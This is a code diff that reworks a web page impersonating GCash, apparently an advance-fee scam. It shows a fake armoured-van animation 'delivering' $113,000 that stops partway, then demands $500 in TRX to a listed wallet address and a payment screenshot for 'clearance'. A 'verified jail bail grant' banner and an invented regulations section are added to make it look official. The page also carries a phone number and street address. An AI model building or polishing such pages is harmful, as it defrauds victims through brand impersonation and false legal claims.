@@ -13,8 +13,12 @@
       --gcash-dark: #003366;
       --gcash-accent: #00c3a0;
       --gcash-gray: #f6f8fa;
-      --road-gray: #212529;
+      --road-gray: #24272b;
       --lane-yellow: #ffe066;
+      --verified-green: #11c26d;
+      --error-red: #ff4d4d;
+      --copy-bg: #f1f8ff;
+      --copy-border: #90caf9;
     }
     body {
       font-family: 'Nunito', Arial, sans-serif;
@@ -34,7 +38,7 @@
       margin-bottom: 24px;
     }
     h1 {
-      font-size: 2.4rem;
+      font-size: 2.3rem;
       font-weight: 800;
       margin: 0 0 8px 0;
       letter-spacing: 1px;
@@ -44,13 +48,13 @@
       gap: 12px;
     }
     .subtitle {
-      font-size: 1.1rem;
+      font-size: 1.09rem;
       color: #d9f2ff;
       margin-top: 0;
     }
     main {
       margin: 0 auto;
-      max-width: 540px;
+      max-width: 570px;
       background: #fff;
       border-radius: 32px;
       box-shadow: 0 4px 32px rgba(0,60,130,.10);
@@ -61,92 +65,149 @@
       display: none;
     }
     .gcash-btn {
-      background: var(--gcash-accent);
+      background: linear-gradient(90deg,#0073e6 40%, #00c3a0 100%);
       color: #fff;
-      font-size: 1.2rem;
+      font-size: 1.15rem;
       font-weight: 700;
-      padding: 14px 34px;
+      padding: 12px 34px;
       border: none;
-      border-radius: 32px;
+      border-radius: 28px;
       margin-top: 24px;
       cursor: pointer;
-      box-shadow: 0 2px 12px 0 rgba(0,0,0,.07);
-      transition: background 0.15s;
+      box-shadow: 0 2px 12px 0 rgba(0,0,0,.08);
+      transition: background 0.18s, box-shadow 0.18s;
+      letter-spacing: .4px;
     }
     .gcash-btn:hover {
-      background: #00977a;
+      background: linear-gradient(100deg,#00c3a0 40%, #0073e6 100%);
+      box-shadow: 0 4px 20px #0073e62b;
     }
-    #loading p {
-      font-size: 1.18rem;
-      color: var(--gcash-blue);
-      font-weight: 700;
-      margin-top: 32px;
+    .notice {
+      color: #0073e6;
+      background: #e6f0ff;
+      border-left: 6px solid #00c3a0;
+      font-size: 1.02rem;
+      margin: 18px 0 6px 0;
+      padding: 10px 20px 10px 18px;
+      border-radius: 12px;
+      text-align: left;
+      box-shadow: 0 1px 7px #0073e61c;
+    }
+    .verified-bar {
+      background: var(--verified-green);
+      color: #fff;
+      padding: 9px 0 9px 0;
+      border-radius: 12px;
+      font-size: 1.12rem;
+      font-weight: 800;
+      letter-spacing: .5px;
+      margin: 15px auto 10px auto;
+      max-width: 410px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 9px;
+      box-shadow: 0 2px 11px 0 #22bc6a22;
     }
     #errorMsg p {
       color: #c0392b;
       font-weight: 700;
       background: #ffeaea;
       border-radius: 14px;
-      padding: 18px 0;
+      padding: 17px 0;
       margin: 24px 0 0 0;
+      transition: 0.3s all;
     }
     #delivery h2 {
       color: var(--gcash-blue);
       font-weight: 900;
       margin-top: 10px;
-      font-size: 1.48rem;
+      font-size: 1.38rem;
       letter-spacing: 0.7px;
     }
     .blinking {
       animation: blink 1.2s infinite;
       color: #d92e2e;
       font-weight: bold;
-      font-size: 1.06rem;
+      font-size: 1.07rem;
     }
     @keyframes blink {
       0% { opacity: 1; }
-      50% { opacity: 0.1; }
+      50% { opacity: 0.15; }
       100% { opacity: 1; }
     }
 
-    /* Road Track and Car */
-    .road-container {
+    /* Road Track and Car - Map View */
+    .road-map-container {
       width: 100%;
-      max-width: 480px;
-      height: 100px;
-      margin: 0 auto 20px auto;
+      max-width: 490px;
+      height: 150px;
+      margin: 0 auto 18px auto;
       position: relative;
       overflow: hidden;
-      display: flex;
-      align-items: center;
-      justify-content: center;
+      background: linear-gradient(180deg, #d2f1ff 60%, #bde2f7 100%);
+      border-radius: 18px;
+      box-shadow: 0 1.5px 11px #0073e62a;
+      border: 2.2px solid #00c3a0;
     }
-    svg#roadTrack {
+    svg#roadMap {
       width: 100%;
-      height: 100px;
+      height: 150px;
       display: block;
+      position: absolute;
+      left: 0; top: 0;
+      z-index: 0;
     }
     .car {
       position: absolute;
-      top: 20px;
-      width: 80px;
-      height: 42px;
+      top: 48px;
+      width: 72px;
+      height: 39px;
       z-index: 2;
       cursor: pointer;
-      transition: filter 0.2s;
+      transition: filter 0.34s, left 0.34s cubic-bezier(.38,1.4,.62,-0.4);
+      will-change: left, filter;
     }
     .car.error {
-      filter: drop-shadow(0 0 10px #ff1a1a);
-      animation: shake 0.5s infinite;
+      filter: drop-shadow(0 0 12px #ff4d4d) brightness(1.13);
+      animation: shake 1.1s cubic-bezier(.37,1.5,.7,-0.6) infinite;
     }
-
     @keyframes shake {
       0% { transform: translateX(0);}
-      20% { transform: translateX(-3px);}
-      40% { transform: translateX(3px);}
-      60% { transform: translateX(-2px);}
-      80% { transform: translateX(2px);}
+      15% { transform: translateX(-3px);}
+      30% { transform: translateX(3px);}
+      45% { transform: translateX(-2px);}
+      60% { transform: translateX(2px);}
+      75% { transform: translateX(-1.5px);}
+      90% { transform: translateX(1.5px);}
       100% { transform: translateX(0);}
+    }
+    .road-label {
+      position: absolute;
+      top: 10px;
+      left: 18px;
+      background: #fff;
+      color: #0073e6;
+      font-weight: 800;
+      font-size: 1.07rem;
+      border-radius: 9px;
+      padding: 3px 13px 3px 13px;
+      box-shadow: 0 2px 7px #0073e62b;
+      z-index: 3;
+      letter-spacing: .2px;
+    }
+    .pick-point {
+      position: absolute;
+      bottom: 10px;
+      right: 18px;
+      background: #fffbe8;
+      color: #ff9800;
+      font-weight: 700;
+      font-size: 0.98rem;
+      border-radius: 9px;
+      padding: 3px 13px;
+      box-shadow: 0 1.5px 7px #ffd60024;
+      z-index: 3;
     }
 
     /* Map */
@@ -155,54 +216,59 @@
     }
     #mapSection h3 {
       color: var(--gcash-accent);
-      font-size: 1.1rem;
+      font-size: 1.10rem;
       margin-bottom: 12px;
+      margin-top: 0;
+      letter-spacing: .1px;
+      font-weight: 800;
     }
     #liveMapFrame {
       width: 100%;
-      max-width: 440px;
-      height: 270px;
-      border: 2px solid var(--gcash-blue);
-      border-radius: 12px;
-      margin-top: 8px;
+      max-width: 465px;
+      height: 240px;
+      border: 2.3px solid var(--gcash-blue);
+      border-radius: 13px;
+      margin-top: 10px;
       box-shadow: 0 2px 18px 0 rgba(0,60,130,.13);
       display: block;
       margin-left: auto;
       margin-right: auto;
+      background: #d2f1ff;
     }
     #carStatus {
       font-size: 1.10rem;
-      margin: 14px 0 0 0;
+      margin: 13px 0 0 0;
       color: var(--gcash-accent);
       font-weight: 800;
     }
-    /* Payment prompt, confirmation, and bill styling */
-    #paymentPrompt, #billSection {
+    /* Payment prompt, confirmation, and regulations styling */
+    #paymentPrompt, #regulationsSection {
       background: var(--gcash-gray);
       border-radius: 18px;
-      margin: 24px 0 0 0;
-      padding: 22px 14px;
+      margin: 26px 0 0 0;
+      padding: 20px 15px 15px 15px;
       box-shadow: 0 2px 12px 0 rgba(0,0,0,.05);
     }
-    #paymentPrompt h3, #billSection h3 {
+    #paymentPrompt h3 {
       color: var(--gcash-blue);
-      font-size: 1.15rem;
+      font-size: 1.16rem;
       margin-bottom: 10px;
       margin-top: 0;
+      font-weight: 800;
     }
-    #paymentPrompt code, #billSection code {
+    #paymentPrompt code {
       background: #e6f7fa;
       color: var(--gcash-dark);
-      font-size: 1.1rem;
+      font-size: 1.04rem;
       padding: 3px 9px;
       border-radius: 8px;
       font-weight: 700;
     }
-    #paymentPrompt em, #billSection em {
+    #paymentPrompt em {
       color: #777;
-      font-size: 0.97rem;
+      font-size: 0.96rem;
     }
-    #paymentPrompt strong, #billSection strong {
+    #paymentPrompt strong {
       color: var(--gcash-dark);
     }
     #paymentPrompt input[type="file"] {
@@ -213,12 +279,64 @@
       border: 1px solid #aaccea;
       font-size: 1rem;
     }
+    .copy-address-row {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 7px;
+      margin-bottom: 7px;
+      flex-wrap: wrap;
+    }
+    .address-box {
+      background: var(--copy-bg);
+      border: 1.5px solid var(--copy-border);
+      border-radius: 10px;
+      padding: 5px 12px;
+      font-size: 1rem;
+      font-weight: 600;
+      color: #0073e6;
+      letter-spacing: .2px;
+      margin-right: 4px;
+      word-break: break-all;
+    }
+    .copy-btn {
+      background: #0073e6;
+      color: #fff;
+      border: none;
+      border-radius: 7px;
+      padding: 5px 10px;
+      font-size: 0.98rem;
+      cursor: pointer;
+      font-weight: bold;
+      letter-spacing: 0.3px;
+      transition: background 0.14s;
+      margin-left: 4px;
+      margin-top: 2px;
+      box-shadow: 0 1.5px 6px #0073e62b;
+    }
+    .copy-btn.copied {
+      background: var(--gcash-accent);
+    }
+    .copy-success {
+      color: var(--gcash-accent);
+      font-weight: 700;
+      font-size: 0.97rem;
+      margin-left: 7px;
+      animation: fadeCopy 2.2s;
+    }
+    @keyframes fadeCopy {
+      0% { opacity: 0;}
+      15% { opacity: 1;}
+      80% {opacity: 1;}
+      100% { opacity: 0;}
+    }
     #confirmation {
       padding: 14px 0 0 0;
     }
     #confirmation h2 {
       color: var(--gcash-accent);
-      font-size: 1.28rem;
+      font-size: 1.27rem;
+      margin-bottom: 8px;
     }
     #confirmation img {
       max-width: 90%;
@@ -227,51 +345,44 @@
       border: 2px solid var(--gcash-blue);
       box-shadow: 0 2px 13px 0 rgba(0,60,130,.11);
     }
-    /* Bill Modal */
-    #billSection {
-      display: none;
-      position: fixed;
-      left: 0; right: 0;
-      top: 0; bottom: 0;
-      margin: auto;
-      width: 90%;
-      max-width: 390px;
-      height: fit-content;
-      z-index: 9999;
-      box-shadow: 0 4px 32px rgba(0,0,0,0.16);
-      background: #fff;
-      border-radius: 24px;
+    /* Regulations Section */
+    #regulationsSection {
+      margin-top: 36px;
+      background: var(--gcash-gray);
+      border-radius: 15px;
+      box-shadow: 0 2px 11px 0 #0073e62a;
+      padding: 22px 16px 18px 16px;
       text-align: left;
-      padding: 38px 24px 32px 24px;
+      font-size: 1.01rem;
+      color: #003366;
     }
-    #closeBillBtn {
-      position: absolute;
-      right: 18px;
-      top: 16px;
-      background: transparent;
-      border: none;
-      font-size: 1.6rem;
-      color: #c0392b;
-      font-weight: bold;
-      cursor: pointer;
+    #regulationsSection h4 {
+      color: #0073e6;
+      font-weight: 800;
+      font-size: 1.07rem;
+      margin-bottom: 5px;
+      margin-top: 0;
     }
-    #billSection ul {
-      margin-top: 8px;
-      margin-bottom: 8px;
+    #regulationsSection ul {
       padding-left: 20px;
+      margin-top: 2px;
+      margin-bottom: 11px;
     }
-    #billSection li {
-      margin-bottom: 6px;
+    #regulationsSection li {
+      margin-bottom: 5px;
     }
+
     /* Responsive */
     @media (max-width: 600px) {
       main {
-        padding: 14px 2vw 16px 2vw;
-        border-radius: 18px;
+        padding: 10px 2vw 9px 2vw;
+        border-radius: 17px;
       }
-      #liveMapFrame { height: 180px; }
-      .road-container { height: 70px; }
-      .car { width: 54px; height: 28px; }
+      #liveMapFrame { height: 138px; }
+      .road-map-container { height: 80px; }
+      .car { width: 46px; height: 22px; }
+      .road-label, .pick-point { font-size: 0.89rem; padding: 3px 10px;}
+      .verified-bar { font-size: 0.97rem; }
     }
   </style>
 </head>
@@ -286,7 +397,13 @@
     <div id="loading">
       <p>Loading your GCash Delivery Interface...</p>
     </div>
-
+    <div class="verified-bar">
+      <svg width="22" height="22" fill="none" style="vertical-align:middle;margin-right:2px"><circle cx="11" cy="11" r="11" fill="#fff" opacity=".22"/><circle cx="11" cy="11" r="9" fill="#fff" opacity=".65"/><path d="M6.5 11.5l3 3 6-6" stroke="#fff" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      VERIFIED JAIL BAIL GRANT AUTHORIZED BY GCASH
+    </div>
+    <div class="notice">
+      <strong>NOTICE:</strong> This delivery is for a <span style="color:#c0392b">Philippines citizen</span> only. Optional pick-out point: <b>MAKATI FIRE SUB STATION</b>
+    </div>
     <div id="delivery">
       <h2>GCASH DELIVERY</h2>
       <button class="gcash-btn" onclick="promptTracking()">Track My Funds Delivery</button>
@@ -297,27 +414,38 @@
     </div>
 
     <div id="mapSection">
-      <div class="road-container" id="roadContainer">
-        <!-- SVG Road -->
-        <svg id="roadTrack" viewBox="0 0 480 100" preserveAspectRatio="none">
-          <!-- Road background -->
-          <rect x="0" y="30" width="480" height="40" rx="18" fill="var(--road-gray)" />
+      <div class="road-map-container" id="roadContainer">
+        <!-- SVG Road Map Style -->
+        <svg id="roadMap" viewBox="0 0 490 150" preserveAspectRatio="none">
+          <!-- Map background -->
+          <rect x="0" y="0" width="490" height="150" fill="#d2f1ff"/>
+          <!-- Main road -->
+          <rect x="25" y="60" width="440" height="30" rx="15" fill="#24272b" />
           <!-- Lane divider -->
-          <rect x="0" y="48" width="480" height="4" fill="var(--lane-yellow)" />
+          <rect x="25" y="74" width="440" height="2.5" fill="#ffe066" />
           <!-- Lane dashes -->
           <g>
-            <rect x="20" y="48" width="40" height="4" fill="#fff"/>
-            <rect x="100" y="48" width="40" height="4" fill="#fff"/>
-            <rect x="180" y="48" width="40" height="4" fill="#fff"/>
-            <rect x="260" y="48" width="40" height="4" fill="#fff"/>
-            <rect x="340" y="48" width="40" height="4" fill="#fff"/>
-            <rect x="420" y="48" width="40" height="4" fill="#fff"/>
+            <rect x="50" y="74" width="36" height="2.5" fill="#fff"/>
+            <rect x="120" y="74" width="36" height="2.5" fill="#fff"/>
+            <rect x="190" y="74" width="36" height="2.5" fill="#fff"/>
+            <rect x="260" y="74" width="36" height="2.5" fill="#fff"/>
+            <rect x="330" y="74" width="36" height="2.5" fill="#fff"/>
+            <rect x="400" y="74" width="36" height="2.5" fill="#fff"/>
           </g>
+          <!-- Map markers (start/end/pick points) -->
+          <circle cx="38" cy="74" r="9" fill="#00c3a0" stroke="#0073e6" stroke-width="2"/>
+          <circle cx="465" cy="74" r="9" fill="#f9a825" stroke="#e65100" stroke-width="2"/>
+          <circle cx="420" cy="120" r="7" fill="#ff9800" stroke="#fff" stroke-width="2"/>
+          <!-- Labels -->
+          <text x="30" y="54" font-size="13" fill="#00c3a0" font-weight="bold">GCash HQ</text>
+          <text x="412" y="58" font-size="13" fill="#e65100" font-weight="bold">La Paz</text>
         </svg>
         <!-- Car -->
         <div class="car" id="deliveryCar" title="Click for details"></div>
+        <span class="road-label">GCash HQ → La Paz, Makati City</span>
+        <span class="pick-point">Pick-out: Makati Fire Sub Station</span>
       </div>
-      <h3>🚚 Vehicle is delivering <span style="color:var(--gcash-blue);font-weight:800">₱107,000 PHP</span> cash</h3>
+      <h3>🚚 Vehicle is delivering <span style="color:var(--gcash-blue);font-weight:800">$113,000 (₱6,452,865)</span> cash</h3>
       <iframe id="liveMapFrame"
         src="https://www.openstreetmap.org/export/embed.html?bbox=121.0124,14.5573,121.0212,14.5640&amp;layer=mapnik&amp;marker=14.5610,121.0168"
         allowfullscreen>
@@ -327,13 +455,17 @@
 
     <div id="paymentPrompt">
       <h3>💸 Payment Required</h3>
-      <p>A payment of <strong>$500 TRX</strong> is needed for delivery clearance.</p>
+      <p>A payment of <strong>$500 TRX</strong> is required for delivery clearance.</p>
       <p><strong>TRX Wallet Address:</strong> <code>TAFVjANEni2zZFkjrst81ULzm56xf1uVoA</code></p>
       <p><em>Philippine law limits PHP cash transport above ₱50,000 without pre-authorization (BSP).</em></p>
-      <p><strong>Delivery address:</strong> 580 Dumas corner Archimedes St., Makati City</p>
+      <div class="copy-address-row">
+        <span class="address-box" id="deliveryAddress">580 Dumas corner Archimedes St., Makati City</span>
+        <button class="copy-btn" onclick="copyAddress(this)">Copy</button>
+        <span class="copy-success" id="copyNotice" style="display:none;">Copied!</span>
+      </div>
       <p><strong>Contact Number:</strong> 09959880442</p>
       <p><strong>Landmark:</strong> La Paz Barangay Hall</p>
-      <p><strong>Awaiting:</strong> ₱107,000 PHP GCash delivery</p>
+      <p><strong>Awaiting:</strong> <span style="color:#0073e6;font-weight:800">$113,000 (₱6,452,865) PHP GCash delivery</span></p>
       <p class="blinking">📍 Vehicle flagged for clearance. Upload payment screenshot to continue.</p>
       <input type="file" accept="image/*" onchange="confirmDelivery(event)" />
     </div>
@@ -345,21 +477,28 @@
       <img id="uploadedImage" src="" alt="Payment Screenshot" />
     </div>
 
-    <!-- Bill Modal -->
-    <div id="billSection">
-      <button id="closeBillBtn" onclick="closeBill()">×</button>
-      <h3>🧾 Delivery Bill & Clearance (GCash Company)</h3>
+    <!-- Regulations Section -->
+    <div id="regulationsSection">
+      <h4>GCash Delivery & Blockchain Regulations</h4>
       <ul>
-        <li><strong>Shipment:</strong> ₱107,000 PHP Cash</li>
-        <li><strong>Sender:</strong> GCash Company HQ</li>
-        <li><strong>Receiver:</strong> You</li>
-        <li><strong>Route:</strong> Makati International Airport → Barangay La Paz, Makati City</li>
-        <li><strong>Delivery Vehicle:</strong> Cash Transit Armoured Van</li>
-        <li><strong>Required Payment:</strong> <span style="color:#c0392b;font-weight:700">$500 TRX</span></li>
-        <li><strong>Status:</strong> <span style="color:#d92e2e;font-weight:700">On Hold – Awaiting Delivery Clearance Payment</span></li>
+        <li>
+          <strong>GCash Regulations:</strong>
+          <ul>
+            <li>Deliveries above ₱50,000 require regulatory clearance under Bangko Sentral ng Pilipinas (BSP) Circular No. 922.</li>
+            <li>Recipient must be a Philippine citizen and present valid identification upon delivery or pick-up.</li>
+            <li>Optional pick-out point available for recipient: Makati Fire Sub Station.</li>
+          </ul>
+        </li>
+        <li>
+          <strong>Blockchain Regulations:</strong>
+          <ul>
+            <li>TRX payment is processed on the TRON blockchain for transparency and traceability.</li>
+            <li>All blockchain transactions are final and irreversible; double-check wallet addresses before payment.</li>
+            <li>GCash adheres to global anti-money laundering (AML) and Know-Your-Customer (KYC) standards for all crypto-fiat conversions and deliveries.</li>
+          </ul>
+        </li>
       </ul>
-      <p><strong>TRX Wallet Address:</strong> <code>TAFVjANEni2zZFkjrst81ULzm56xf1uVoA</code></p>
-      <p><em>Please upload payment proof in the app to continue delivery.</em></p>
+      <div style="color:#c0392b;margin-top:6px;font-size:0.98rem;"><b>Note:</b> Fraudulent claims or non-compliance may result in legal action. All deliveries are subject to Philippine law and monitoring.</div>
     </div>
   </main>
   <script>
@@ -367,28 +506,28 @@
     let carEl, roadEl, carWidth, roadWidth, moveInterval, carPos = 0;
     let attempts = 0, errorTriggered = false;
     const maxAttempts = 5;
-    const centerPercent = 0.52; // Car past center triggers error (52% of road length)
+    const centerPercent = 0.54; // Car past center triggers error (54% of road length)
 
     // Car SVG (GCash blue, professional, money bag on top)
     const carSVG = `
-      <svg viewBox="0 0 80 42" fill="none" width="80" height="42">
+      <svg viewBox="0 0 72 39" fill="none" width="72" height="39">
         <!-- Shadow -->
-        <ellipse cx="40" cy="40" rx="24" ry="6" fill="#222" opacity="0.17"/>
+        <ellipse cx="36" cy="37" rx="19" ry="5" fill="#222" opacity="0.12"/>
         <!-- Body -->
-        <rect x="8" y="13" width="64" height="16" rx="7" fill="#0073e6" stroke="#003366" stroke-width="2"/>
+        <rect x="6" y="11" width="60" height="15" rx="7" fill="#0073e6" stroke="#003366" stroke-width="2"/>
         <!-- Roof -->
-        <rect x="24" y="7" width="32" height="16" rx="7" fill="#00c3a0" stroke="#0073e6" stroke-width="2"/>
+        <rect x="20" y="5" width="32" height="14" rx="7" fill="#00c3a0" stroke="#0073e6" stroke-width="1.8"/>
         <!-- Windows -->
-        <rect x="30" y="10" width="20" height="11" rx="3" fill="#fff" opacity="0.92"/>
+        <rect x="27" y="8.5" width="18" height="8" rx="2.5" fill="#fff" opacity="0.93"/>
         <!-- Wheels -->
-        <circle cx="20" cy="33" r="6" fill="#222"/>
-        <circle cx="60" cy="33" r="6" fill="#222"/>
-        <circle cx="20" cy="33" r="3" fill="#ccc"/>
-        <circle cx="60" cy="33" r="3" fill="#ccc"/>
+        <circle cx="19" cy="29" r="5" fill="#222"/>
+        <circle cx="53" cy="29" r="5" fill="#222"/>
+        <circle cx="19" cy="29" r="2.3" fill="#ccc"/>
+        <circle cx="53" cy="29" r="2.3" fill="#ccc"/>
         <!-- Money Bag -->
-        <ellipse cx="40" cy="3.5" rx="7" ry="4" fill="#ffe066" stroke="#bfa300" stroke-width="1"/>
-        <rect x="36" y="0" width="8" height="6" rx="3" fill="#ffe066" stroke="#bfa300" stroke-width="1"/>
-        <text x="40" y="7.5" font-size="7" text-anchor="middle" fill="#bfa300" font-weight="bold">$</text>
+        <ellipse cx="36" cy="2.5" rx="6" ry="3.3" fill="#ffe066" stroke="#bfa300" stroke-width="1"/>
+        <rect x="33" y="0" width="6" height="5" rx="2.7" fill="#ffe066" stroke="#bfa300" stroke-width="1"/>
+        <text x="36" y="7.2" font-size="6" text-anchor="middle" fill="#bfa300" font-weight="bold">$</text>
       </svg>
     `;
 
@@ -441,9 +580,9 @@
 
     function startCarAnimation() {
       carEl = document.getElementById('deliveryCar');
-      roadEl = document.getElementById('roadTrack');
-      carWidth = carEl.offsetWidth || 80;
-      roadWidth = roadEl.getBoundingClientRect().width || 480;
+      roadEl = document.getElementById('roadMap');
+      carWidth = carEl.offsetWidth || 72;
+      roadWidth = roadEl.getBoundingClientRect().width || 490;
       carPos = 0;
       errorTriggered = false;
       carEl.classList.remove('error');
@@ -453,17 +592,17 @@
       clearInterval(moveInterval);
       moveInterval = setInterval(() => {
         if (carPos < roadWidth - carWidth) {
-          carPos += 3.5;
+          carPos += 3.1;
           carEl.style.left = carPos + "px";
-          // If car is past center (52%), show error (stop and blink)
+          // If car is past center (54%), show error (stop and blink)
           if (!errorTriggered && carPos > (roadWidth * centerPercent)) {
             errorTriggered = true;
             carEl.classList.add('error');
-            document.getElementById("carStatus").innerHTML = "🚨 <b>Delivery vehicle stopped for payment clearance!</b> Click the vehicle for details.";
+            document.getElementById("carStatus").innerHTML = "🚨 <b>Smooth stop: Delivery vehicle flagged for payment clearance.</b> Click the vehicle for payment details.";
             clearInterval(moveInterval);
           }
         }
-      }, 24);
+      }, 28);
 
       // Reset car position visually
       carEl.style.left = "0px";
@@ -471,15 +610,11 @@
       document.getElementById("carStatus").innerText = "🚗 Vehicle is in transit from GCash HQ to Barangay La Paz, Makati City...";
     }
 
-    // Bill Modal Logic
+    // Bill Modal Logic (now triggers payment prompt)
     function triggerBill() {
       if (!errorTriggered) return;
-      document.getElementById('billSection').style.display = 'block';
       document.getElementById('paymentPrompt').style.display = 'block';
-      document.getElementById("carStatus").innerHTML = "🚨 <b>Delivery vehicle stopped for payment clearance!</b> See bill and upload payment to resume delivery.";
-    }
-    function closeBill() {
-      document.getElementById('billSection').style.display = 'none';
+      document.getElementById("carStatus").innerHTML = "🚨 <b>Delivery vehicle flagged for payment clearance!</b> See payment section and upload payment to resume delivery.";
     }
 
     function confirmDelivery(event) {
@@ -488,12 +623,23 @@
       reader.onload = function(e) {
         document.getElementById("uploadedImage").src = e.target.result;
         document.getElementById("paymentPrompt").style.display = "none";
-        document.getElementById("billSection").style.display = "none";
         document.getElementById("confirmation").style.display = "block";
       };
       if (fileInput.files && fileInput.files[0]) {
         reader.readAsDataURL(fileInput.files[0]);
       }
+    }
+    // Address Copy Logic
+    function copyAddress(btn) {
+      const address = document.getElementById('deliveryAddress').innerText;
+      navigator.clipboard.writeText(address).then(function() {
+        btn.classList.add('copied');
+        document.getElementById('copyNotice').style.display = 'inline';
+        setTimeout(() => {
+          btn.classList.remove('copied');
+          document.getElementById('copyNotice').style.display = 'none';
+        }, 1800);
+      });
     }
     // Responsive: Re-calc road width if window resizes
     window.addEventListener('resize', () => {
